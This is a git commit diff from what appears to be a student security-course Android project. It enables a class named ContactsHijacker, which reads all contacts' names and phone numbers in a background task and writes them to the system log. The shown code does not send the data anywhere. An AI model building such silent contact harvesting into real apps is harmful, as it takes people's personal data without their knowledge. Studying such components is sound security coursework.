143afa4d815afdfaf65da664e721212ba49d2b49
juan2511 <juann.vanecek@gmail.com>
2015-06-27 18:19:40 -0300

    ContactsHijacker logea los contactos

--- app/src/main/java/com/seginfo/tp/seginfotp/Contact.java
+++ app/src/main/java/com/seginfo/tp/seginfotp/Contact.java
@@ -7,11 +7,16 @@ public class Contact {
     int _id;
     String _nombre;
     String _telefonos;
+
     public Contact(int id, String nombre, String telefonos)
     {
         _id = id;
         _nombre = nombre;
         _telefonos = telefonos;
+    }
+
+    public String asString(){
+        return "{id:"+_id+"; _nombre:"+_nombre+"; telefonos:["+_telefonos+"]}";
     }
 }
 
--- app/src/main/java/com/seginfo/tp/seginfotp/ContactsHijacker.java
+++ app/src/main/java/com/seginfo/tp/seginfotp/ContactsHijacker.java
@@ -8,53 +8,49 @@ import android.content.ContentResolver;
 import android.database.Cursor;
 import android.os.AsyncTask;
 import android.provider.ContactsContract;
+import android.util.Log;
+import android.widget.Toast;
+
 import java.util.ArrayList;
 
-public class ContactsHijacker extends AsyncTask<Activity, Void, String> {
+public class ContactsHijacker extends AsyncTask<Activity, Void, Integer> {
 
     Activity _act;
 
     @Override
-    protected String doInBackground(Activity... args) {
+    protected Integer doInBackground(Activity... args) {
         _act = args[0];
-        //obtener_contactos();
-        return "OK";
+        obtener_contactos();
+        return 0;
     }
 
-    public ArrayList<Contact> obtener_contactos() {
+    private void obtener_contactos() {
+        Log.i("MyActivity", "displayContacts");
         ContentResolver cr = _act.getContentResolver();
-        ArrayList<Contact> listaDeContactos = new ArrayList<Contact>();
-        String[] select =
-            { ///DATOS DEL CONTACTO A SOLICITAR (select _ID, DISPLAY_NAME from  ....)
-                ContactsContract.Contacts._ID,
-                ContactsContract.Contacts.DISPLAY_NAME
-            };
-        Cursor mCursor = cr.query(
-                ContactsContract.Contacts.CONTENT_URI, select,
-                null, null, null);
-        while (mCursor.moveToNext()) {
-            String idContacto = mCursor.getString(
-                    mCursor.getColumnIndex(ContactsContract.Contacts._ID));
-            String nombre = mCursor.getString(
-                    mCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
-            String telefonosDelContacto = "";
-            Cursor phones = cr.query(
-                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
-                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + idContacto,
-                    null, null);
-            if (phones.moveToNext()) {
-                String tel = phones.getString(
-                        phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                telefonosDelContacto += tel;
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null);
+        if (cur.getCount() > 0) {
+            while (cur.moveToNext()) {
+                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                String phones = "";
+                if (Integer.parseInt(cur.getString(
+                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
+                    Cursor pCur = cr.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
+                            new String[]{id}, null);
+                    while (pCur.moveToNext()) {
+                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        phones += phoneNo+",";
+                    }
+                    pCur.close();
+                }
+                Contact contacto = new Contact(Integer.parseInt(id), name, phones);
+                Log.i("MyActivity", contacto.asString());
             }
-            if (telefonosDelContacto != "") {
-                listaDeContactos.add(
-                        new Contact(Integer.parseInt(idContacto), nombre, telefonosDelContacto));
-            }
-            phones.close();
         }
-        mCursor.close();
-        return listaDeContactos;
     }
 }
 
